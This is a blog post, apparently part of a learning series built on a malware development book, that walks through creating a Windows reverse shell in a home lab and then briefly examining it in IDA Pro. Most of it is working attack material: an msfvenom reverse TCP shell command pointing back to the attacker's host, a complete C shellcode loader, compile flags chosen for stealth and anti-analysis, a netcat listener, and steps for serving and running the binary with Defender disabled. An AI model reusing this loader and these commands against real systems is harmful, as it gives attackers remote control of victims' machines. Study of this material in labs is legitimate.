---
layout: post
title: 0 MALDEV - Easy Reverse Shell 
category : [Reverse, MALDEV]
tags: reverse
---

In this series, I'll be working through the "Malware Development for Ethical Hackers" book. I'll be developing malwares, testing them, and then reversing them to understand how they works.

## Lab Setup

For my testing environment, I have:
- A Kali Linux machine for development
- Two Windows 10 machines in a private network

This setup allows me to develop malware on Kali and run/analyze it on the Windows machines safely.

## Reverse Shell and msfvenom Payload Review

### Generating the Payload

Let's start by creating a reverse shell payload using msfvenom:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali ip> LPORT=4444 -f c
```

#### Understanding the Command

**`msfvenom`** is Metasploit Framework's payload generator tool that creates custom shellcode and executables.

**Key Parameters:**
- **`-p windows/x64/shell_reverse_tcp`** - Specifies the payload type:
  - `windows/x64/` - Targets Windows 64-bit systems
  - `shell_reverse_tcp` - Creates a reverse shell over TCP
- **`LHOST=<kali ip>`** - The attacker's IP address where the reverse shell will connect back to
- **`LPORT=4444`** - The port on the attacker's machine where the reverse shell will connect
- **`-f c`** - Outputs the payload as a C array (hexadecimal bytes for embedding in C code)

### The C Implementation

Here's the main C code that will execute our shellcode:

```c
#include <windows.h>    // Windows API functions for memory allocation and thread creation
#include <stdio.h>      // Standard I/O functions (not used but commonly included)
#include <stdlib.h>     // Standard library functions (not used but commonly included)
#include <string.h>     // String manipulation functions (not used but commonly included)

// Array containing the shellcode generated by msfvenom
unsigned char actual_payload[] = <code generated from msfvenom> ;

// Size of the shellcode array for memory allocation
unsigned int actual_payload_length = sizeof(actual_payload);

int main(void) {
  void * memory_for_payload;   // Pointer to allocated memory for shellcode
  BOOL operation_status;       // Status of VirtualProtect operation
  HANDLE thread_handle;        // Handle to the thread that will execute shellcode
  DWORD previous_protection_level = 0;  // Stores previous memory protection level

  // Allocate executable memory for the shellcode
  // MEM_COMMIT: Commits the memory immediately
  // MEM_RESERVE: Reserves the memory space
  // PAGE_READWRITE: Initially sets memory as readable/writable (not executable)
  memory_for_payload = VirtualAlloc(0, actual_payload_length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

  // Copy the shellcode from the array to the allocated memory
  RtlMoveMemory(memory_for_payload, actual_payload, actual_payload_length);

  // Change memory protection from READ/WRITE to EXECUTE/READ
  // This is necessary because modern systems prevent execution of writable memory (DEP)
  operation_status = VirtualProtect(memory_for_payload, actual_payload_length, PAGE_EXECUTE_READ, &previous_protection_level);
  if ( operation_status != 0 ) {
    // Create a new thread that executes the shellcode
    // The shellcode (reverse shell) will start running in this thread
    thread_handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) memory_for_payload, 0, 0, 0);
    // Wait indefinitely for the thread to complete (reverse shell to finish)
    WaitForSingleObject(thread_handle, -1);
  }
  return 0;
}
```

### Compilation with MinGW

We'll use MinGW to cross-compile our C code into a Windows executable:

```bash
x86_64-w64-mingw32-gcc hack.c -o hack.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

#### Compilation Flags Explained

**`x86_64-w64-mingw32-gcc`** - Cross-compiler for creating Windows 64-bit executables from Linux/Unix systems.

**Key Flags:**
- **`hack.c`** - Source file to compile
- **`-o hack.exe`** - Output filename
- **`-s`** - Strips symbols (removes debug information, function names, and variable names)
- **`-ffunction-sections`** - Places each function in its own section for better dead code elimination
- **`-fdata-sections`** - Places each data item in its own section for better dead code elimination
- **`-Wno-write-strings`** - Suppresses warnings about writing to string literals (useful for shellcode arrays)
- **`-fno-exceptions`** - Disables exception handling to reduce executable size and complexity
- **`-fmerge-all-constants`** - Merges identical constants to reduce executable size
- **`-static-libstdc++`** - Statically links the C++ standard library (no external dependencies)
- **`-static-libgcc`** - Statically links the GCC runtime library (no external dependencies)

#### Why These Flags Matter for Malware Development

These compilation flags serve several important purposes:

1. **Cross-compilation** - Creates a Windows executable from a Linux system
2. **Size optimization** - Reduces executable size through various optimization techniques
3. **Stealth enhancement** - Removes symbols and debug information to make reverse engineering harder
4. **Dependency elimination** - Creates a standalone executable that doesn't require external DLLs
5. **Anti-analysis** - Makes the binary harder to analyze by removing function names and symbols

**Critical flags for malware:**
- **`-s`** - Removes debugging symbols that could reveal function names and structure
- **`-ffunction-sections` and `-fdata-sections`** - Enables better dead code elimination, reducing file size
- **`-static-libstdc++` and `-static-libgcc`** - Ensures the malware runs on any Windows system without missing dependencies
- **`-fno-exceptions`** - Reduces complexity and size by removing exception handling overhead

### Testing the Malware

#### Setting Up the Attacker (Kali)

On the Kali machine, we need to set up two services:

1. **Netcat listener** to receive the reverse shell:
```bash
nc -nvlp 4444
```

2. **HTTP server** to serve the malware:
```bash
python3 -m http.server
```

#### Executing on the Target (Windows 10)

On the Windows 10 machine:
1. Disable Windows Defender (for testing purposes)
2. Open a web browser and navigate to `http://<kali ip>:8000`
3. Download the malware executable
4. Run the executable

#### Results

When successful, you'll receive a reverse shell on your Kali machine:

![res](/assets/images/maldev/0/reverseexec.png)

## Reverse Engineering with IDA

Now let's analyze our malware using IDA Pro to understand how it works.

### Initial Analysis

I started by examining the code function by function, but even for this small program, there's quite a bit of code to sift through. Let's take a step back and check the **Imports** subview first:

![ida](/assets/images/maldev/0/ida1.png)

### Identifying Suspicious Functions

We can immediately spot some suspicious functions in the imports. I'll focus on `CreateThread` since it only has two cross-references (both in the same function), which could give us insight into what payload is being executed:

![ida](/assets/images/maldev/0/ida2.png)

### Finding the Payload

Perfect! We found all the juicy information in one function. The payload generated by msfvenom is clearly visible in the code:

![ida](/assets/images/maldev/0/ida3.png)

### Next Steps

It would be interesting to explore ways to transform this payload back into its original msfvenom command. This could help us understand the exact parameters used to generate the shellcode.
